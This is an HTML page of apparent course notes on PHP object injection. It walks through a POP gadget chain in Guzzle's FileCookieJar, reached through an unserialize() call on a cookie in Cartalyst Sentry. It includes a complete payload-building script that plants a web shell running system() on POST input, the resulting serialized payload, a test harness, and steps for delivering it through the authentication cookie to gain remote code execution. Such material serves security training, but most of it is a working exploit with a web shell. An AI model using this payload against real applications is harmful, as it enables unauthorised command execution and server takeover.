<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Exploitation</title>
</head><body><b>Exploit Building Process - Overview</b><br/>
1. Find vulnerable application<br/>
2. Find POP gadgets in used libraries<br/>
3. Create composer.json file with POP gadget library on a VM<br/>
4. On VM, install library via Composer<br/>
5. Build working payload object on VM, serialize it<br/>
6. Unserialize payload on VM to test<br/>
7. Supply serialized payload object to vulnerable web application<br/>
<br/>
<b>Example – Step 1: Find vulnerable application</b><br/>
/src/Cartalyst/Sentry/Cookies/NativeCookie.php<br/>
…<ul><li style="list-style-type: none">public function getCookie()</li>
<li style="list-style-type: none">{</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">…</li>
<li style="list-style-type: none">return unserialize($_COOKIE[$this-&gt;getKey()]);</li>
<li style="list-style-type: none">…</li>
</ul>
</li>
<li style="list-style-type: none">}</li>
</ul>
}<br/>
<br/>
<b>Example - Step 2: Find POP gadgets in used libraries</b><br/>
Next, find useful POP gadgets in libraries used by application.<br/>
composer.json a good place to look for libraries in use:<br/>
{<ul><li style="list-style-type: none">&quot;require&quot;: {</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">&quot;cartalyst/sentry&quot;: &quot;2.1.5&quot;,</li>
<li style="list-style-type: none">&quot;illuminate/database&quot;: &quot;4.0.*&quot;,</li>
<li style="list-style-type: none">&quot;guzzlehttp/guzzle&quot;: &quot;6.0.2&quot;,</li>
<li style="list-style-type: none">&quot;swiftmailer/swiftmailer&quot;: &quot;5.4.1&quot;</li>
</ul>
</li>
<li style="list-style-type: none">}</li>
</ul>
}<br/>
<br/>
Grep for __destruct:<br/>
/guzzle/src/Cookie/FileCookieJar.php<ul><li style="list-style-type: none"><b>namespace GuzzleHttp\Cookie;</b></li>
<li style="list-style-type: none">class FileCookieJar extends CookieJar</li>
<li style="list-style-type: none">…</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">public function __destruct()</li>
<li style="list-style-type: none">{</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none"><b>$this-&gt;save($this-&gt;filename);</b></li>
</ul>
</li>
</ul>
</li>
<li style="list-style-type: none">}	</li>
</ul>
</li>
<li style="list-style-type: none">...</li>
</ul>
<br/>
Analyze functions used (save() in this case)<ul><li style="list-style-type: none">public function <b>save($filename)</b></li>
<li style="list-style-type: none">{</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">$json = [];</li>
<li style="list-style-type: none">foreach ($this as $cookie) {</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">/** @var SetCookie $cookie */</li>
<li style="list-style-type: none">if ($cookie-&gt;getExpires() &amp;&amp; !$cookie-&gt;getDiscard()) {</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none"><b>$json[] = $cookie-&gt;toArray();</b></li>
</ul>
</li>
<li style="list-style-type: none">}</li>
</ul>
</li>
<li style="list-style-type: none">}</li>
<li style="list-style-type: none"><b>if (false === file_put_contents($filename, json_encode($json)))</b>{</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">throw new \RuntimeException(&quot;Unable to save file {$filename}&quot;);</li>
</ul>
</li>
<li style="list-style-type: none">}</li>
</ul>
</li>
<li style="list-style-type: none">}</li>
</ul>
The value of $json <ul><li style="list-style-type: none">comes from $cookie&gt;toArray(), where $cookie is the object in question.</li>
</ul>
Need to make sure that $cookie&gt;getExpires() returns True, and $cookie&gt;getDiscard() returns False<br/>
<br/>
$cookie-&gt;getExpires()<br/>
!$cookie-&gt;getDiscard()<br/>
$json[] = $cookie-&gt;toArray()<br/>
These methods all come from the SetCookie class.<br/>
<br/>
namespace GuzzleHttp\Cookie;<br/>
class SetCookie<ul><li style="list-style-type: none">…</li>
<li style="list-style-type: none">public function toArray(){</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">return $this-&gt;data;</li>
</ul>
</li>
<li style="list-style-type: none">}</li>
<li style="list-style-type: none">…</li>
<li style="list-style-type: none">public function getExpires(){</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">return $this-&gt;data['Expires'];</li>
</ul>
</li>
<li style="list-style-type: none">}</li>
<li style="list-style-type: none">…</li>
<li style="list-style-type: none">public function getDiscard(){</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">return $this-&gt;data['Discard'];</li>
</ul>
</li>
<li style="list-style-type: none">}</li>
</ul>
<br/>
<b>Example - Step 3: Create composer.json</b><br/>
Create composer.json file with POP gadget library on a VM:<br/>
VM composer.json contents:<br/>
{<ul><li style="list-style-type: none">&quot;require&quot;: {</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">&quot;guzzlehttp/guzzle&quot;: &quot;6.0.2&quot;</li>
</ul>
</li>
<li style="list-style-type: none">}</li>
</ul>
}<br/>
<br/>
<b>Example - Step 4: Install Composer + Libraries</b><br/>
1. Download and install composer:<ul><li style="list-style-type: none">curl -sS https://getcomposer.org/installer | php</li>
</ul>
2. Install the dependencies in our composer.json file:<ul><li style="list-style-type: none">php composer.phar install</li>
</ul>
<br/>
<b>Example - Step 4: Install Composer + Libraries<br/>
Example - Step 5: Build Payload<br/>
</b>&lt;?php<br/>
require __DIR__ . '/vendor/autoload.php';<br/>
<br/>
use GuzzleHttp\Cookie\FileCookieJar;<br/>
use GuzzleHttp\Cookie\SetCookie;<br/>
<br/>
$obj = new FileCookieJar('/var/www/html/shell.php');<br/>
<br/>
$payload = '&lt;?php echo system($_POST[\'poc\']); ?&gt;';<br/>
$obj-&gt;setCookie(new SetCookie([<ul><li style="list-style-type: none">'Name' =&gt; 'foo', 'Value' =&gt; 'bar',</li>
<li style="list-style-type: none">'Domain' =&gt; $payload,</li>
<li style="list-style-type: none">'Expires' =&gt; time()]));</li>
</ul>
<br/>
file_put_contents('./built_payload_poc', serialize($obj));<br/>
<br/>
Run it, and obtain the serialized output.<br/>
# php build_payload.php<br/>
# cat built_payload_poc<br/>
O:31:&quot;GuzzleHttp\Cookie\FileCookieJar&quot;:3:{s:41:&quot;GuzzleHttp\Cookie\FileCookieJarfilename&quot;;s:23:&quot;/var/www/html/shell.php&quot;;s:36:&quot;GuzzleHttp\Cookie\CookieJarcookies&quot;;a:1:{i:1;O:27:&quot;GuzzleHttp\Cookie\SetCookie&quot;:1:{s:33:&quot;GuzzleHttp\Cookie\SetCookiedata&quot;;a:9:{s:4:&quot;Name&quot;;s:3:&quot;foo&quot;;s:5:&quot;Value&quot;;s:3:&quot;bar&quot;;s:6:&quot;Domain&quot;;s:36:&quot;&lt;?php echo system($_POST['poc']);?&gt;&quot;;s:4:&quot;Path&quot;;s:1:&quot;/&quot;;s:7:&quot;MaxAge&quot;;N;s:7:&quot;Expires&quot;;i:1450225029;s:6:&quot;Secure&quot;;b:0;s:7:&quot;Discard&quot;;b:0;s:8:&quot;HttpOnly&quot;;b:0;}}}s:39:&quot;GuzzleHttp\Cookie\CookieJarstrictMode&quot;;N;}<br/>
<br/>
<b>Example - Step 6: Unserialize payload to test</b><br/>
Now that a payload has been generated, it can be tested in the VM.<br/>
Create a PHP file that reads the payload from disc, and unserializes it. When this file is executed, the POP gadget chain should fire, and the target file (“/var/www/html/shell.php”) should be written. <br/>
test_unserialize.php<br/>
&lt;?php<br/>
require __DIR__ . '/vendor/autoload.php';<br/>
unserialize(file_get_contents(&quot;./built_payload_poc&quot;));<br/>
<br/>
<br/>
LIVE FIRE CYBER EXERCISE<br/>
Practical PHP Object Injection<br/>
1. Application has a “secure” login form.<br/>
2. Authenticate with the application:<br/>
3. Application will set an authentication cookie:<br/>
<img src="image.png"/><br/>
4. Observe that the application makes use of this cookie; without it, we’re not authenticated:<br/>
5. Observe shell.php doesn’t yet exist:<br/>
6. Replace the cookie value’s object with the malicious object, and send request. POP chain will fire upon deserialization:<br/>
<img src="image 2.png"/><br/>
7. shell.php now exists, and remote code execution achieved:<br/>
<br/>
<br/>
Exploit Building Process - Tips<br/>
Try and confirm the application is calling unserialize() on supplied input<ul><li style="list-style-type: none">500 errors etc</li>
</ul>
Generate payloads with array() if required:<ul><li style="list-style-type: none">array($obj);</li>
</ul>
Take care with payload encoding:<ul>e.g. If the final payload needs to survive json_encode()use single quotes,</ul>
rather than doubles<br/>
Favour more popular libraries, and __wakeup()</body></html>